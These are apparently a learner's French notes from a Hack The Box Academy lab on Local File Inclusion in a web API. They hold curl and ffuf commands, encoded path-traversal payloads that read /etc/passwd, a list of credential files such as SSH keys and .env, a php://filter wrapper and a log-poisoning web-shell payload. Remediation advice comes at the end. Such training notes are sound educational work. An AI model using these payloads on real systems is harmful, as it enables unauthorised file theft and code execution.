---
titre: "Local File Inclusion (LFI)"
aliases:
  - "Local File Inclusion (LFI)"
plateforme: "Hack The Box Academy"
module: "Web Service & API Attacks"
date: 2026-07-02
tags: [HTB, API, LFI, PathTraversal, FileRead, Notes]
---

# 🧩 Local File Inclusion (LFI)

Lié : [[18 - Cheatsheet Payloads]] · [[17 - Outils ffuf sqlmap]]

---

## Principe

Une LFI survient quand une app utilise un **input utilisateur pour construire un chemin de fichier** sans validation. En injectant des `../`, on remonte l'arborescence et on lit **n'importe quel fichier lisible** par le serveur (`/etc/passwd`, configs, clés, logs).

---

## Détection

```bash
# reco de l'API
curl http://<TARGET>:3000/api        # {"status":"UP"}

# fuzzing d'endpoints API (wordlist API !)
ffuf -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
     -u 'http://<TARGET>:3000/api/FUZZ'
# → /api/download

# l'endpoint attend un fichier
curl http://<TARGET>:3000/api/download
# {"error":"Input the filename via /download/<filename>"}   ← candidat LFI

# exploitation (path traversal ENCODÉ)
curl "http://<TARGET>:3000/api/download/..%2f..%2f..%2f..%2fetc%2fhosts"
```

---

## Points clés

### 1. Encoder les `../`
`..%2f` = `../` encodé. **Pourquoi encoder ?** Sinon le serveur/routeur interprète les `/` comme des séparateurs de route **avant** que l'input n'atteigne le code vulnérable. Encodés, ils passent dans le paramètre et ne sont décodés qu'à la lecture du fichier.

### 2. Le nombre de `../` n'a pas d'importance → en mettre trop
Arrivé à la racine `/`, un `../` de plus reste à `/`. Donc on **spamme** 8-10 `../` et on ne calcule jamais :
```bash
curl "http://<TARGET>:3000/api/download/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"
```

### 3. Toujours `/etc/passwd` en premier
Confirme la LFI **et** énumère les utilisateurs :
```
user:x:UID:GID:GECOS:/home/user:/bin/bash
     └ le shell /bin/bash = compte utilisable ; nologin/false = service
     └ UID >= 1000 = comptes humains
```
> ❓ *Question HTB* : user commençant par `ub` → `ubuntu` (vu dans `/etc/passwd`, UID 1000).

Isoler rapidement :
```bash
curl -s "http://<TARGET>:3000/api/download/..%2f..%2f..%2f..%2fetc%2fpasswd" | grep ^ub
```

---

## Trouver les fichiers cibles sans deviner

Wordlist de fichiers sensibles connus :
```bash
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
     -u "http://<TARGET>:3000/api/download/FUZZ" -fs <TAILLE_ERREUR>
```
> `-fs <TAILLE_ERREUR>` = filtrer la taille de `{"error":"File not found!"}` (mesure-la sur un fichier bidon). Attention : cette wordlist a des `/` bruts → prévoir une version encodée si l'API les interprète mal.

Automatisation nuclei (pipeline ProjectDiscovery) :
```bash
nuclei -u "http://<TARGET>:3000/api/download/" -tags lfi
```

---

## Cibles utiles après `/etc/passwd`

```
/etc/passwd, /etc/hosts, /etc/shadow (si root)
/home/<user>/.ssh/id_rsa, id_ed25519, id_ecdsa   ← accès SSH direct
/var/www/html/config.php, app.js, .env            ← creds en dur
/proc/self/environ, /proc/self/cmdline
```
Wrapper PHP (cibles PHP) : `php://filter/convert.base64-encode/resource=/etc/passwd`.

---

## Aller plus loin : LFI → RCE (Log Poisoning)

Injecter du PHP dans un log (via User-Agent), puis inclure le log via la LFI pour l'exécuter :
```
1) User-Agent: <?php system($_GET['c']); ?>   (loggé dans access.log)
2) LFI vers /var/log/apache2/access.log?c=id
```
Module dédié : *File Inclusion* (HTB).

---

## Remédiation

- Ne jamais construire un chemin depuis un input ; utiliser un identifiant → mapping serveur.
- `basename()`, whitelist de fichiers, `realpath()` + vérif du préfixe autorisé.
- Désactiver les wrappers dangereux.
